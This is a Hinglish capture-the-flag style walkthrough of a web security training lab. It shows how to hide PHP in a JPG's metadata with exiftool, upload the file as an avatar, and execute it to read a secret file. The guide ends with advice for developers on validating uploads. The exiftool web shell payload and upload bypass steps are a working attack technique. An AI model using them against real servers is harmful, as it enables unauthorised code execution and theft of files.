# Remote code execution via polyglot web shell upload

## 📋 Problem Kya Hai?

* Server image uploads allow karta hai, lekin **PHP files** ko block karta hai.
* Agar hum ek **JPG image** ke metadata mein PHP code chhupa dein aur file ka naam `.php` rakhein, to server confuse ho jata hai.
* Ye **polyglot file** hoti hai — jo image bhi hai aur PHP bhi chalati hai.

---

## 🧰 Tools Jo Chahiye

* 🖥️ Terminal (Linux/Mac) ya Command Prompt (Windows)
* 📷 Ek simple JPG image (e.g., `test.jpg`)
* 🔧 [ExifTool](https://exiftool.org/) — image metadata edit karne ke liye
* 🕷️ Burp Suite — HTTP requests monitor karne ke liye
* 🌐 Browser (lab website ke liye)

---

## 🚀 Step-by-Step Solution

### ✅ Step 1: ExifTool Install Karo

Pehle check karo ke ExifTool installed hai ya nahi. Agar nahi hai, to terminal mein ye command run karo:

```bash
sudo apt install exiftool
```

Ye command ExifTool install karegi. Ab tum ready ho polyglot file banane ke liye!

---

### 🖼️ Step 2: Polyglot File Banayein

1. Ek JPG image lo, jise `test.jpg` naam do.
2. Terminal mein ye command run karo:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" test.jpg -o polyglot.php
```

**Ye command kya karta hai?**
* `test.jpg` ke metadata mein PHP code inject karta hai.
* Output file `polyglot.php` banati hai, jo image bhi hai aur PHP bhi.

**Note:** Agar error aaye, to ensure karo ke `test.jpg` usi folder mein hai jahan tum command run kar rahe ho.

---

### 🔐 Step 3: Lab Mein Login Karo

* Lab ki website pe jao.
* In credentials ke sath login karo:
  ```
  Username: wiener
  Password: peter
  ```
* "My Account" → "Upload Avatar" pe jao.

---

### 📤 Step 4: Polyglot File Upload Karo

1. `polyglot.php` file ko avatar ke tor pe upload karo.
2. Server isse allow karega, kyun ke ye ek valid JPG ki tarah behave karta hai, lekin asal mein PHP code bhi chhupa hai.

**Kyun kaam karta hai?**
* Server file extension aur content type check karta hai, lekin metadata ko deeply validate nahi karta.
* Ye ek common developer mistake hai — **proper validation** na karna.

---

### 🕵️ Step 5: Secret Key Nikalo

1. Browser ya Burp Suite mein ye URL check karo:
   ```
   https://<your-lab-id>.web-security-academy.net/files/avatars/polyglot.php
   ```
2. Response mein dhoondo: `START` aur `END`.
3. In dono ke darmiyan mein secret key hogi, e.g., `XyzAbcSecretValue123`.

---

### 🏁 Step 6: Secret Submit Karo

* Lab ke banner pe “Submit Solution” ka box hoga.
* Secret key (jo `START` aur `END` ke darmiyan mili) copy karke paste karo.
* **Lab Solved!** 🎉

---

## 📌 Real-World Lesson

**Polyglot files** real-world mein tab kaam aati hain jab:
* Developers sirf file extension (.jpg, .png) check karte hain, lekin content ya metadata validate nahi karte.
* Attackers metadata mein malicious code chhupa dete hain.

**Developers ke liye lesson:**
* File uploads ke liye **strict validation** lagao:
  * Extension check karo.
  * File content aur metadata bhi verify karo.
  * PHP files ko execute hone se rokne ke liye server configuration tight rakho.

